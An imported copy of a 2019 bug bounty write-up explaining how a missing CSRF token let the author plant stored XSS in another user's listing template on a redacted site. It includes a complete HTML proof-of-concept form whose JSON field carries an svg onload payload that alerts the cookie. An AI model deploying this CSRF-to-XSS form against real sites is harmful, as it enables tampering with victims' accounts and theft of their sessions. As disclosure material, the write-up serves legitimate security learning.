---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-04-25_csrf-attack-can-lead-to-stored-xss.md
original_filename: 2019-04-25_csrf-attack-can-lead-to-stored-xss.md
title: CSRF Attack can lead to Stored XSS
category: documents
detected_topics:
- xss
- command-injection
- rate-limit
- csrf
- api-security
tags:
- imported
- documents
- xss
- command-injection
- rate-limit
- csrf
- api-security
language: en
raw_sha256: 6a1f0c1e36115b5f528636668392f0b0ae3d386b748cd78957b77d5b0e01cfbb
text_sha256: 1bcd2b54f5c9140a582b9a43f3f05095df4ba3602458cb947a7dd56b8fd6fa42
ingested_at: '2026-06-28T07:31:59Z'
sensitivity: unknown
redactions_applied: false
---

# CSRF Attack can lead to Stored XSS

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-04-25_csrf-attack-can-lead-to-stored-xss.md
- Source Type: markdown
- Detected Topics: xss, command-injection, rate-limit, csrf, api-security
- Ingested At: 2026-06-28T07:31:59Z
- Redactions Applied: False
- Raw SHA256: `6a1f0c1e36115b5f528636668392f0b0ae3d386b748cd78957b77d5b0e01cfbb`
- Text SHA256: `1bcd2b54f5c9140a582b9a43f3f05095df4ba3602458cb947a7dd56b8fd6fa42`


## Content

---
title: "CSRF Attack can lead to Stored XSS"
url: "https://medium.com/bugbountywriteup/csrf-attack-can-lead-to-stored-xss-f40ba91f1e4f"
authors: ["Mohamed Sayed (@FlEx0Geek)"]
bugs: ["CSRF", "Stored XSS"]
publication_date: "2019-04-25"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5290
scraped_via: "browseros"
---

# CSRF Attack can lead to Stored XSS

CSRF Attack can lead to Stored XSS
Mohamed Sayed
Follow
2 min read
·
Apr 25, 2019

38

Press enter or click to view image in full size

Heeeeeey guys, I’m here again with a new write up about CSRF with XSS :P.

Get Mohamed Sayed’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

First a few days ago I was testing a website lets call it example.com and I found a subdomain on this website which includes some functions so I start to test it I found a Self-Stored XSS on a description field which allows HTML tags and I found a CSRF attack to add the XSS payload but there is a problem I should get the template ID to edit it and I can’t Brute Force it on this time I left it alone, nowadays when I return to test I opened my Burp and caught requests I found an interesting request I sent it to Repeater and sent it again and I found that a new template added to my template list WOW this is good, I scanned the request and I didn’t found any CSRF protection

the cool thing in the request include the template ID which I can use it to add some contents on the template fields in this time I remembered the old bug which is Self-Stored XSS so I tried to exploit these two bugs together to get Strored XSS I created an HTML file as POC this is the code

<form action="https://subdomain.example.com/endpoint" method="POST">
  <input type="text" name="svcid" value="WRKSPC_LAYER_SERVICE"><br>
  <input type="text" name="stok" value=""><br>
  <input type="text" name="v" value="0"><br>
  <input type="text" name="clientType" value=""><br>
  <input type="text" name="request" value='{"basePage":{"draftIds":["1514844016810"],"wsId":"-1","wsType":"-1"},"fields":{"title":"CSRF_1","bold":"false"},"fields":{"description":"<font rwr=\"1\" style=\"font-family:Arial\" size=\"4\"><br>\"&gt;<svg onload=\"alert(cookie)\">\n</svg></font>","rteMode":"0"},"mode":"INDIVIDUAL","action":"SAVE","layerName":"EDITPANE","variation":null,"currencyInfo":{"currencySymbolLeft":true,"singularName":"U.S. dollars","moneySymbol":"$","decimalSymbol":".","groupingSymbol":",","gS":",","decimalPlaces":"2","currencyCode":"USD","pluralName":"U.S. dollar"},"singleList":true,"listingMode":"AddItem","updateRequired":true,"customFields":{},"byPassUpdate":false,"sellerType":"C2C","saveUlsi":true,"edpCrNew":false,"deletedFields":[],"customAttributes":{"PL_SELLER_ELIGIBLE":"1","PL_FORMAT_ELIGIBLE":"1","PL_CATEGORY_ELIGIBLE":"1","PL_ALREADY_OPTED":"0"},"draftMode":"Listing","restricted":false,"customPreference":{"preferences":{"scheduleStartTime":true,"reservePrice":true,"sellAsLot":true,"privateListing":true,"salesTax":true},"sellerDetails":["BUSINESS_POLICY","NO_STORE_SUBSCRIPTION","NO_SHIPPING_DISCOUNTS","NON_SM_SELLER"]},"payments20":false,"templateId":5553489011,"isvShown":false}'><br>
  <input type="submit" value="send">
</form>

this code will send a request to edit a template with id 1514844016810 so the server will not found a template with this id so he will create it and add the new value which is the XSS payload which added to the description, when the victim visits his template list he will found a new one so he will open it and BOOOM the XSS payload will be executed, I was:

I hope you enjoy it guys goodbye see you soon.
